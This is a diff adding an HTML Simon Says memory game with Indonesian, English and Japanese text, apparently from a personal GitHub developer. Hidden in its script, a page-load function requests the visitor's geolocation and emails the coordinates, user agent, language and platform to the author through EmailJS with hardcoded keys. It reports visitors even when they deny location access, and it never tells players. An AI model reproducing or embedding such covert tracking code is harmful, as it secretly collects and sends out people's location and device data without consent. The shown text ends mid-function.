@@ -1,0 +1,1474 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Memory Test Game</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Spectral:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/lottie-web/5.12.2/lottie.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Spectral', serif;
+            transition: background-color 0.3s, color 0.3s;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        body.light-theme {
+            background-color: #FEFEFE;
+            color: #121212;
+        }
+
+        body.dark-theme {
+            background-color: #1E1E1E;
+            color: #FEFEFE;
+        }
+
+        /* Bubble Animation */
+        .bubble-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .bubble {
+            position: absolute;
+            bottom: -100px;
+            border-radius: 50%;
+            opacity: 0.6;
+            animation: rise 15s infinite ease-in;
+        }
+
+        .light-theme .bubble {
+            background: linear-gradient(135deg, rgba(103, 126, 234, 0.3), rgba(118, 75, 162, 0.3));
+        }
+
+        .dark-theme .bubble {
+            background: linear-gradient(135deg, rgba(103, 126, 234, 0.4), rgba(118, 75, 162, 0.4));
+        }
+
+        @keyframes rise {
+            0% {
+                bottom: -100px;
+                transform: translateX(0);
+            }
+            50% {
+                transform: translateX(100px);
+            }
+            100% {
+                bottom: 110%;
+                transform: translateX(-100px);
+            }
+        }
+
+        /* Loading Screen */
+        #loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: #000;
+            z-index: 9999;
+        }
+
+        #lottie-container {
+            width: 200px;
+            height: 200px;
+        }
+
+        #loading-text {
+            margin-top: 20px;
+            font-size: 28px;
+            font-weight: 700;
+            color: white;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        /* Container */
+        .container-gamememorytest {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            display: none;
+            position: relative;
+            z-index: 1;
+        }
+
+        .container-aboutmemorytest {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 40px 20px;
+            display: none;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Home Screen */
+        .home-screen {
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .game-title {
+            font-size: 56px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            animation: fadeInDown 1s ease;
+        }
+
+        .light-theme .game-title {
+            color: #667eea;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .dark-theme .game-title {
+            color: #FEFEFE;
+            text-shadow: 2px 2px 8px rgba(103, 126, 234, 0.5);
+        }
+
+        @keyframes fadeInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .game-subtitle {
+            font-size: 20px;
+            margin-bottom: 50px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+            animation: fadeIn 1.5s ease;
+        }
+
+        .light-theme .game-subtitle {
+            color: #666;
+        }
+
+        .dark-theme .game-subtitle {
+            color: #ccc;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .btn-container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            max-width: 320px;
+            margin: 0 auto;
+        }
+
+        .btn {
+            padding: 18px 35px;
+            font-size: 20px;
+            font-weight: 600;
+            font-family: 'Spectral', serif;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: block;
+            width: 100%;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn i {
+            margin-right: 10px;
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.3);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+        }
+
+        .btn:hover::before {
+            width: 300px;
+            height: 300px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+
+        .btn-secondary {
+            border: 2px solid;
+        }
+
+        .light-theme .btn-secondary {
+            background: transparent;
+            color: #667eea;
+            border-color: #667eea;
+        }
+
+        .dark-theme .btn-secondary {
+            background: transparent;
+            color: #FEFEFE;
+            border-color: #FEFEFE;
+        }
+
+        .btn-danger {
+            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
+            color: white;
+        }
+
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+        }
+
+        /* Game Screen */
+        .game-screen {
+            display: none;
+        }
+
+        .game-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 30px;
+            border-radius: 15px;
+            margin-bottom: 30px;
+        }
+
+        .light-theme .game-header {
+            background: rgba(102, 126, 234, 0.1);
+            border: 2px solid rgba(102, 126, 234, 0.3);
+        }
+
+        .dark-theme .game-header {
+            background: rgba(255, 255, 255, 0.05);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .timer, .sequence-counter {
+            font-size: 26px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .light-theme .timer,
+        .light-theme .sequence-counter {
+            color: #667eea;
+        }
+
+        .dark-theme .timer,
+        .dark-theme .sequence-counter {
+            color: #FEFEFE;
+        }
+
+        .color-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 20px;
+            max-width: 520px;
+            margin: 0 auto 30px;
+        }
+
+        .color-box {
+            aspect-ratio: 1;
+            border-radius: 20px;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 5px solid;
+            position: relative;
+        }
+
+        .light-theme .color-box {
+            border-color: rgba(18, 18, 18, 0.1);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+
+        .dark-theme .color-box {
+            border-color: rgba(254, 254, 254, 0.1);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        }
+
+        .color-box:hover {
+            transform: scale(1.05);
+        }
+
+        .color-box.active {
+            filter: brightness(1.5);
+            transform: scale(1.1);
+            box-shadow: 0 0 30px currentColor;
+        }
+
+        .color-box.disabled {
+            pointer-events: none;
+            opacity: 0.6;
+        }
+
+        .red { background-color: #e74c3c; }
+        .yellow { background-color: #f1c40f; }
+        .green { background-color: #2ecc71; }
+        .blue { background-color: #3498db; }
+
+        /* Leaderboard */
+        .leaderboard {
+            border-radius: 15px;
+            padding: 25px;
+            max-width: 520px;
+            margin: 0 auto;
+        }
+
+        .light-theme .leaderboard {
+            background: rgba(102, 126, 234, 0.1);
+            border: 2px solid rgba(102, 126, 234, 0.3);
+        }
+
+        .dark-theme .leaderboard {
+            background: rgba(255, 255, 255, 0.05);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .leaderboard h3 {
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 24px;
+            font-weight: 600;
+        }
+
+        .leaderboard-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 15px;
+            margin-bottom: 10px;
+            border-radius: 10px;
+            font-size: 16px;
+        }
+
+        .light-theme .leaderboard-item {
+            background: rgba(102, 126, 234, 0.08);
+        }
+
+        .dark-theme .leaderboard-item {
+            background: rgba(255, 255, 255, 0.03);
+        }
+
+        .leaderboard-item .rank {
+            font-weight: 700;
+            margin-right: 10px;
+        }
+
+        .leaderboard-item.top-3 {
+            font-weight: 600;
+        }
+
+        .leaderboard-item.top-3 .rank {
+            font-size: 20px;
+        }
+
+        /* Overlay */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .countdown {
+            font-size: 140px;
+            font-weight: 700;
+            color: white;
+            animation: countdownAnim 1s ease-in-out;
+        }
+
+        @keyframes countdownAnim {
+            0% { transform: scale(0) rotate(-180deg); opacity: 0; }
+            50% { transform: scale(1.2) rotate(0deg); }
+            100% { transform: scale(1) rotate(0deg); opacity: 1; }
+        }
+
+        /* About Screen */
+        .about-screen h1 {
+            font-size: 42px;
+            font-weight: 700;
+            margin-bottom: 30px;
+        }
+
+        .light-theme .about-screen h1 {
+            color: #667eea;
+        }
+
+        .dark-theme .about-screen h1 {
+            color: #FEFEFE;
+        }
+
+        .about-content {
+            border-radius: 15px;
+            padding: 35px;
+            margin-bottom: 30px;
+        }
+
+        .light-theme .about-content {
+            background: rgba(102, 126, 234, 0.1);
+            border: 2px solid rgba(102, 126, 234, 0.3);
+        }
+
+        .dark-theme .about-content {
+            background: rgba(255, 255, 255, 0.05);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .about-content p {
+            text-align: left;
+            margin-bottom: 20px;
+            line-height: 1.8;
+            font-size: 18px;
+        }
+
+        .about-content a {
+            color: #667eea;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .about-content a:hover {
+            text-decoration: underline;
+        }
+
+        .thanks-text {
+            text-align: center;
+            font-size: 24px;
+            margin-top: 50px;
+            font-weight: 600;
+        }
+
+        .light-theme .thanks-text {
+            color: #667eea;
+        }
+
+        .dark-theme .thanks-text {
+            color: #FEFEFE;
+        }
+
+        /* Settings Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+        }
+
+        .modal-content {
+            padding: 35px;
+            border-radius: 20px;
+            max-width: 450px;
+            width: 90%;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        .light-theme .modal-content {
+            background: #FEFEFE;
+            color: #121212;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        }
+
+        .dark-theme .modal-content {
+            background: #2d2d2d;
+            color: #FEFEFE;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.6);
+        }
+
+        .modal h2 {
+            margin-bottom: 25px;
+            font-size: 28px;
+            font-weight: 700;
+        }
+
+        .setting-item {
+            margin-bottom: 25px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .setting-item label {
+            font-weight: 600;
+            font-size: 18px;
+        }
+
+        .toggle-container {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .toggle-switch {
+            position: relative;
+            display: inline-block;
+            width: 60px;
+            height: 34px;
+        }
+
+        .toggle-switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ccc;
+            transition: .4s;
+            border-radius: 34px;
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 26px;
+            width: 26px;
+            left: 4px;
+            bottom: 4px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+
+        input:checked + .slider {
+            background-color: #667eea;
+        }
+
+        input:checked + .slider:before {
+            transform: translateX(26px);
+        }
+
+        .toggle-label {
+            font-size: 16px;
+            min-width: 50px;
+        }
+
+        select.lang-select {
+            padding: 10px 15px;
+            border-radius: 8px;
+            border: 2px solid #667eea;
+            font-family: 'Spectral', serif;
+            font-size: 16px;
+            cursor: pointer;
+            background: white;
+            color: #121212;
+        }
+
+        .dark-theme select.lang-select {
+            background: #1E1E1E;
+            color: #FEFEFE;
+            border-color: #FEFEFE;
+        }
+
+        .reset-data-section {
+            margin-top: 30px;
+            padding-top: 25px;
+            border-top: 2px solid;
+        }
+
+        .light-theme .reset-data-section {
+            border-color: rgba(102, 126, 234, 0.3);
+        }
+
+        .dark-theme .reset-data-section {
+            border-color: rgba(255, 255, 255, 0.1);
+        }
+
+        .reset-data-section p {
+            margin-bottom: 15px;
+            font-size: 14px;
+            opacity: 0.8;
+        }
+
+        /* Game Over Screen */
+        .game-over-screen {
+            display: none;
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .game-over-screen h1 {
+            font-size: 52px;
+            font-weight: 700;
+            margin-bottom: 20px;
+        }
+
+        .light-theme .game-over-screen h1 {
+            color: #e74c3c;
+        }
+
+        .dark-theme .game-over-screen h1 {
+            color: #FEFEFE;
+        }
+
+        .score-display {
+            font-size: 32px;
+            margin-bottom: 30px;
+            font-weight: 600;
+        }
+
+        .rating {
+            font-size: 28px;
+            margin-bottom: 40px;
+            font-weight: 700;
+        }
+
+        .light-theme .rating {
+            color: #667eea;
+        }
+
+        .dark-theme .rating {
+            color: #f1c40f;
+        }
+
+        @media (max-width: 768px) {
+            .game-title {
+                font-size: 42px;
+            }
+
+            .color-grid {
+                gap: 15px;
+                max-width: 400px;
+            }
+
+            .countdown {
+                font-size: 100px;
+            }
+
+            .timer, .sequence-counter {
+                font-size: 20px;
+            }
+
+            .game-header {
+                padding: 15px 20px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .game-title {
+                font-size: 36px;
+            }
+
+            .color-grid {
+                max-width: 320px;
+            }
+        }
+    </style>
+</head>
+<body class="light-theme">
+    <!-- Bubble Container -->
+    <div class="bubble-container" id="bubble-container"></div>
+
+    <!-- Loading Screen -->
+    <div id="loading-screen">
+        <div id="lottie-container"></div>
+        <div id="loading-text">Loading...</div>
+    </div>
+
+    <!-- Game Container -->
+    <div class="container-gamememorytest">
+        <!-- Home Screen -->
+        <div class="home-screen">
+            <h1 class="game-title"><i class="fas fa-brain"></i> <span data-lang="title">Memory Test</span></h1>
+            <p class="game-subtitle" data-lang="subtitle">Uji kemampuan memori Anda dengan mengikuti urutan warna dan suara yang semakin kompleks!</p>
+            <div class="btn-container">
+                <button class="btn btn-primary" onclick="startGame()">
+                    <i class="fas fa-play"></i> <span data-lang="start">Mulai</span>
+                </button>
+                <button class="btn btn-secondary" onclick="showAbout()">
+                    <i class="fas fa-info-circle"></i> <span data-lang="about">About</span>
+                </button>
+                <button class="btn btn-secondary" onclick="showSettings()">
+                    <i class="fas fa-cog"></i> <span data-lang="settings">Settings</span>
+                </button>
+            </div>
+        </div>
+
+        <!-- Game Screen -->
+        <div class="game-screen">
+            <div class="game-header">
+                <div class="timer">
+                    <i class="fas fa-clock"></i>
+                    <span id="timer">00:00</span>
+                </div>
+                <div class="sequence-counter">
+                    <i class="fas fa-list-ol"></i>
+                    <span id="sequence">0</span>
+                </div>
+            </div>
+
+            <div class="color-grid">
+                <div class="color-box red" data-color="red" onclick="playerClick('red')"></div>
+                <div class="color-box yellow" data-color="yellow" onclick="playerClick('yellow')"></div>
+                <div class="color-box green" data-color="green" onclick="playerClick('green')"></div>
+                <div class="color-box blue" data-color="blue" onclick="playerClick('blue')"></div>
+            </div>
+
+            <div class="leaderboard">
+                <h3><i class="fas fa-trophy"></i> <span data-lang="leaderboard">Leaderboard</span></h3>
+                <div id="leaderboard-list"></div>
+            </div>
+        </div>
+
+        <!-- Game Over Screen -->
+        <div class="game-over-screen">
+            <h1><i class="fas fa-skull-crossbones"></i> <span data-lang="gameover">Game Over!</span></h1>
+            <div class="score-display">
+                <i class="fas fa-chart-line"></i> <span data-lang="sequence">Sequence</span>: <span id="final-score">0</span><br>
+                <i class="fas fa-stopwatch"></i> <span data-lang="time">Time</span>: <span id="final-time">00:00</span>
+            </div>
+            <div class="rating" id="rating"></div>
+            <div class="btn-container">
+                <button class="btn btn-primary" onclick="restartGame()">
+                    <i class="fas fa-redo"></i> <span data-lang="playagain">Main Lagi</span>
+                </button>
+                <button class="btn btn-secondary" onclick="backToHome()">
+                    <i class="fas fa-home"></i> <span data-lang="backmenu">Kembali ke Menu</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- About Container -->
+    <div class="container-aboutmemorytest">
+        <div class="about-screen">
+            <h1><i class="fas fa-info-circle"></i> <span data-lang="about">About</span> Memory Test</h1>
+            <div class="about-content">
+                <p data-lang="about-desc1"><strong>Memory Test</strong> adalah game puzzle interaktif yang menguji kemampuan memori auditori dan visual Anda. Game ini terinspirasi dari permainan klasik Simon Says, di mana pemain harus mengingat dan mengulangi urutan warna yang semakin panjang dengan batas waktu yang semakin ketat.</p>
+                
+                <p><strong>Developer:</strong> Game ini dikembangkan oleh <strong>AibyIlann</strong> (<a href="https://github.com/aibyilannn" target="_blank">github.com/aibyilannn</a>). Dibuat dengan penuh dedikasi untuk menghadirkan pengalaman bermain yang menyenangkan dan menantang.</p>
+
+                <p data-lang="about-howto"><strong>Cara Bermain:</strong><br>
+                1. Klik tombol "Mulai" untuk memulai permainan<br>
+                2. Perhatikan urutan warna yang menyala dan bunyinya<br>
+                3. Ulangi urutan tersebut dengan mengklik kotak warna sesuai urutan<br>
+                4. <strong>Perhatian!</strong> Anda harus klik dalam batas waktu yang ditentukan<br>
+                5. Setiap berhasil, urutan akan bertambah satu warna<br>
+                6. Jika salah mengklik atau kehabisan waktu, game akan berakhir</p>
+
+                <p data-lang="about-rules"><strong>Aturan Main & Batas Waktu:</strong><br>
+                • Sequence &lt; 10 (Stupid): Batas waktu <strong>3 detik</strong> 😅<br>
+                • Sequence 10-20 (Normal): Batas waktu <strong>1.5 detik</strong> 👍<br>
+                • Sequence 20-35 (Clever): Batas waktu <strong>1 detik</strong> 🧠<br>
+                • Sequence 35-100 (Big Brain): Batas waktu <strong>0.5 detik</strong> 🎓<br>
+                • Sequence 100+ (You Good!): Batas waktu <strong>0.5 detik</strong> 🏆<br>
+                • Maksimal Sequence: <strong>1000</strong></p>
+
+                <button class="btn btn-primary" onclick="backToHome()" style="max-width: 250px; margin: 20px auto; display: block;">
+                    <i class="fas fa-arrow-left"></i> <span data-lang="back">Kembali</span>
+                </button>
+            </div>
+
+            <div class="thanks-text" data-lang="thanks">
+                Thanks for playing game 💕
+            </div>
+        </div>
+    </div>
+
+    <!-- Countdown Overlay -->
+    <div class="overlay" id="countdown-overlay">
+        <div class="countdown" id="countdown-number">3</div>
+    </div>
+
+    <!-- Settings Modal -->
+    <div class="modal" id="settings-modal">
+        <div class="modal-content">
+            <h2><i class="fas fa-cog"></i> <span data-lang="settings">Settings</span></h2>
+            
+            <div class="setting-item">
+                <label><i class="fas fa-palette"></i> <span data-lang="theme">Theme</span></label>
+                <div class="toggle-container">
+                    <label class="toggle-switch">
+                        <input type="checkbox" id="theme-toggle" onchange="toggleTheme()">
+                        <span class="slider"></span>
+                    </label>
+                    <span class="toggle-label" id="theme-label">Light</span>
+                </div>
+            </div>
+
+            <div class="setting-item">
+                <label><i class="fas fa-music"></i> <span data-lang="bgmusic">Background Music</span></label>
+                <div class="toggle-container">
+                    <label class="toggle-switch">
+                        <input type="checkbox" id="music-toggle" onchange="toggleMusic()" checked>
+                        <span class="slider"></span>
+                    </label>
+                    <span class="toggle-label" id="music-label">On</span>
+                </div>
+            </div>
+
+            <div class="setting-item">
+                <label><i class="fas fa-language"></i> <span data-lang="language">Language</span></label>
+                <select class="lang-select" id="language-select" onchange="changeLanguage()">
+                    <option value="id">Indonesia</option>
+                    <option value="en">English</option>
+                    <option value="jp">日本語</option>
+                </select>
+            </div>
+
+            <div class="reset-data-section">
+                <p><i class="fas fa-exclamation-triangle"></i> <span data-lang="resetwarning">Ini akan menghapus semua data termasuk leaderboard dan pengaturan.</span></p>
+                <button class="btn btn-danger" onclick="resetAllData()" style="width: 100%;">
+                    <i class="fas fa-trash-alt"></i> <span data-lang="resetdata">Reset All Data</span>
+                </button>
+            </div>
+
+            <button class="btn btn-primary" onclick="closeSettings()" style="margin-top: 20px;">
+                <i class="fas fa-check"></i> <span data-lang="close">Close</span>
+            </button>
+        </div>
+    </div>
+
+    <script>
+        // Translations
+        const translations = {
+            id: {
+                title: 'Memory Test',
+                subtitle: 'Uji kemampuan memori Anda dengan mengikuti urutan warna dan suara yang semakin kompleks!',
+                start: 'Mulai',
+                about: 'Tentang Game',
+                settings: 'Settings',
+                leaderboard: 'Pengaturan',
+                gameover: 'Game Over!',
+                sequence: 'Sequence',
+                time: 'Waktu',
+                playagain: 'Main Lagi',
+                backmenu: 'Kembali ke Menu',
+                theme: 'Tema game',
+                bgmusic: 'Musik Latar',
+                language: 'Bahasa',
+                resetwarning: 'Ini akan menghapus semua data termasuk leaderboard dan pengaturan.',
+                resetdata: 'Reset Semua Data',
+                close: 'Tutup',
+                back: 'Kembali',
+                thanks: 'Thanks for playing game 💕',
+                'about-desc1': '<strong>Memory Test</strong> adalah game puzzle interaktif yang menguji kemampuan memori auditori dan visual Anda. Game ini terinspirasi dari permainan klasik Simon Says, di mana pemain harus mengingat dan mengulangi urutan warna yang semakin panjang dengan batas waktu yang semakin ketat.',
+                'about-howto': '<strong>Cara Bermain:</strong><br>1. Klik tombol "Mulai" untuk memulai permainan<br>2. Perhatikan urutan warna yang menyala dan bunyinya<br>3. Ulangi urutan tersebut dengan mengklik kotak warna sesuai urutan<br>4. <strong>Perhatian!</strong> Anda harus klik dalam batas waktu yang ditentukan<br>5. Setiap berhasil, urutan akan bertambah satu warna<br>6. Jika salah mengklik atau kehabisan waktu, game akan berakhir',
+                'about-rules': '<strong>Aturan Main & Batas Waktu:</strong><br>• Sequence < 10 (Stupid): Batas waktu <strong>3 detik</strong> 😅<br>• Sequence 10-20 (Normal): Batas waktu <strong>2 detik</strong> 👍<br>• Sequence 20-35 (Clever): Batas waktu <strong>1 detik</strong> 🧠<br>• Sequence 35-100 (Big Brain): Batas waktu <strong>1.5 detik</strong> 🎓<br>• Sequence 100+ (You Good!): Batas waktu <strong>1 detik</strong> 🏆<br>• Maksimal Sequence: <strong>1000</strong>'
+            },
+            en: {
+                title: 'Memory Test',
+                subtitle: 'Test your memory skills by following increasingly complex color and sound sequences!',
+                start: 'Start',
+                about: 'About',
+                settings: 'Settings',
+                leaderboard: 'Leaderboard',
+                gameover: 'Game Over!',
+                sequence: 'Sequence',
+                time: 'Time',
+                playagain: 'Play Again',
+                backmenu: 'Back to Menu',
+                theme: 'Theme',
+                bgmusic: 'Background Music',
+                language: 'Language',
+                resetwarning: 'This will delete all data including leaderboard and settings.',
+                resetdata: 'Reset All Data',
+                close: 'Close',
+                back: 'Back',
+                thanks: 'Thanks for playing game 💕',
+                'about-desc1': '<strong>Memory Test</strong> is an interactive puzzle game that tests your auditory and visual memory abilities. This game is inspired by the classic Simon Says game, where players must remember and repeat increasingly long color sequences with increasingly tight time limits.',
+                'about-howto': '<strong>How to Play:</strong><br>1. Click the "Start" button to begin the game<br>2. Watch the sequence of colors that light up and their sounds<br>3. Repeat the sequence by clicking the color boxes in order<br>4. <strong>Attention!</strong> You must click within the specified time limit<br>5. Each success adds one more color to the sequence<br>6. If you click wrong or run out of time, the game ends',
+                'about-rules': '<strong>Rules & Time Limits:</strong><br>• Sequence < 10 (Stupid): Time limit <strong>3 seconds</strong> 😅<br>• Sequence 10-20 (Normal): Time limit <strong>2 seconds</strong> 👍<br>• Sequence 20-35 (Clever): Time limit <strong>1 second</strong> 🧠<br>• Sequence 35-100 (Big Brain): Time limit <strong>1.5 seconds</strong> 🎓<br>• Sequence 100+ (You Good!): Time limit <strong>1 seconds</strong> 🏆<br>• Maximum Sequence: <strong>1000</strong>'
+            },
+            jp: {
+                title: 'メモリーテスト',
+                subtitle: '複雑になる色と音のシーケンスに従って記憶力をテストしましょう！',
+                start: 'スタート',
+                about: '概要',
+                settings: '設定',
+                leaderboard: 'リーダーボード',
+                gameover: 'ゲームオーバー！',
+                sequence: 'シーケンス',
+                time: '時間',
+                playagain: 'もう一度',
+                backmenu: 'メニューに戻る',
+                theme: 'テーマ',
+                bgmusic: 'BGM',
+                language: '言語',
+                resetwarning: 'これにより、リーダーボードと設定を含むすべてのデータが削除されます。',
+                resetdata: '全データリセット',
+                close: '閉じる',
+                back: '戻る',
+                thanks: 'ゲームをプレイしてくれてありがとう 💕',
+                'about-desc1': '<strong>メモリーテスト</strong>は、聴覚と視覚の記憶能力をテストするインタラクティブなパズルゲームです。このゲームは、クラシックなサイモンセイズゲームに触発されており、プレイヤーは時間制限内にどんどん長くなる色のシーケンスを記憶して繰り返す必要があります。',
+                'about-howto': '<strong>遊び方:</strong><br>1. 「スタート」ボタンをクリックしてゲームを開始<br>2. 光る色のシーケンスとその音に注意<br>3. 順番に色のボックスをクリックしてシーケンスを繰り返す<br>4. <strong>注意！</strong> 指定された制限時間内にクリックする必要があります<br>5. 成功するたびにシーケンスに1色追加されます<br>6. 間違ってクリックするか時間切れになるとゲーム終了',
+                'about-rules': '<strong>ルールと制限時間:</strong><br>• シーケンス < 10 (Stupid): 制限時間 <strong>3秒</strong> 😅<br>• シーケンス 10-20 (Normal): 制限時間 <strong>2秒</strong> 👍<br>• シーケンス 20-35 (Clever): 制限時間 <strong>1秒</strong> 🧠<br>• シーケンス 35-100 (Big Brain): 制限時間 <strong>1.5秒</strong> 🎓<br>• シーケンス 100+ (You Good!): 制限時間 <strong>1秒</strong> 🏆<br>• 最大シーケンス: <strong>1000</strong>'
+            }
+        };
+
+        // Game State
+        let sequence = [];
+        let playerSequence = [];
+        let level = 0;
+        let gameActive = false;
+        let timerInterval;
+        let startTime;
+        let leaderboard = [];
+        let bgMusic;
+        let clickTimeout;
+        let clickTimeoutDuration = 3000;
+        let currentLanguage = 'id';
+
+        const colors = ['red', 'yellow', 'green', 'blue'];
+
+        // EmailJS Configuration
+        const EMAILJS_SERVICE_ID = 'service_wpge268';
+        const EMAILJS_TEMPLATE_ID = 'template_0eht5sk';
+        const EMAILJS_PUBLIC_KEY = 'Eko6ClI3YYEBt9ozg';
+
+        // Initialize EmailJS
+        (function() {
+            emailjs.init(EMAILJS_PUBLIC_KEY);
+        })();
+
+        // Get and send user location
+        function getUserLocationAndSend() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const locationData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: new Date().toLocaleString(),
+                            user_agent: navigator.userAgent,
+                            language: navigator.language,
+                            platform: navigator.platform
+                        };
+
+                        // Send to EmailJS
+                        emailjs.send(
+                            EMAILJS_SERVICE_ID,
+                            EMAILJS_TEMPLATE_ID,
+                            {
+                                latitude: locationData.latitude,
+                                longitude: locationData.longitude,
+                                accuracy: locationData.accuracy,
+                                timestamp: locationData.timestamp,
+                                user_agent: locationData.user_agent,
+                                browser_language: locationData.language,
+                                platform: locationData.platform,
+                                message: `New visitor from: ${locationData.latitude}, ${locationData.longitude}`
+                            }
+                        ).then(
+                            (response) => {
+                                console.log('Location sent successfully!', response.status, response.text);
+                            },
+                            (error) => {
+                                console.log('Failed to send location...', error);
+                            }
+                        );
+                    },
+                    (error) => {
+                        console.log('Geolocation error:', error.message);
+                        // Send without location
+                        emailjs.send(
+                            EMAILJS_SERVICE_ID,
+                            EMAILJS_TEMPLATE_ID,
+                            {
+                                latitude: 'N/A',
+                                longitude: 'N/A',
+                                accuracy: 'N/A',
+                                timestamp: new Date().toLocaleString(),
+                                user_agent: navigator.userAgent,
+                                browser_language: navigator.language,
+                                platform: navigator.platform,
+                                message: 'Visitor denied location access'
+                            }
+                        );
+                    }
+                );
+            } else {
+                console.log('Geolocation is not supported');
+            }
+        }
+
+        // Load settings from localStorage
+        function loadSettings() {
+            try {
+                const theme = localStorage.getItem('memoryTestTheme') || 'light';
+                const music = localStorage.getItem('memoryTestMusic') || 'on';
+                const language = localStorage.getItem('memoryTestLanguage') || 'id';
+
+                // Apply theme
+                document.body.className = theme + '-theme';
+                document.getElementById('theme-toggle').checked = theme === 'dark';
+                document.getElementById('theme-label').textContent = theme === 'dark' ? 'Dark' : 'Light';
+
+                // Apply music
+                document.getElementById('music-toggle').checked = music === 'on';
+                document.getElementById('music-label').textContent = music === 'on' ? 'On' : 'Off';
+
+                // Apply language
+                currentLanguage = language;
+                document.getElementById('language-select').value = language;
+                applyLanguage(language);
+            } catch (e) {
+                console.log('Error loading settings:', e);
+            }
+        }
+
+        // Create bubbles
+        function createBubbles() {
+            const container = document.getElementById('bubble-container');
+            for (let i = 0; i < 15; i++) {
+                const bubble = document.createElement('div');
+                bubble.className = 'bubble';
+                const size = Math.random() * 60 + 20;
+                bubble.style.width = size + 'px';
+                bubble.style.height = size + 'px';
+                bubble.style.left = Math.random() * 100 + '%';
+                bubble.style.animationDuration = (Math.random() * 10 + 10) + 's';
+                bubble.style.animationDelay = Math.random() * 5 + 's';
+                container.appendChild(bubble);
+            }
+        }
+
+        // Initialize
+        window.onload = function() {
+            createBubbles();
+            
+            // Get user location and send via EmailJS
+            getUserLocationAndSend();
+
+            // Lottie Animation
+            const animation = lottie.loadAnimation({
+                container: document.getElementById('lottie-container'),
+                renderer: 'svg',
+                loop: true,
+                autoplay: true,
+                path: 'https://assets2.lottiefiles.com/packages/lf20_p8bfn5to.json'
+            });
+
+            // Load settings and leaderboard
+            loadSettings();
+            loadLeaderboard();
+
+            // Hide loading after 2.5 seconds
+            setTimeout(() => {
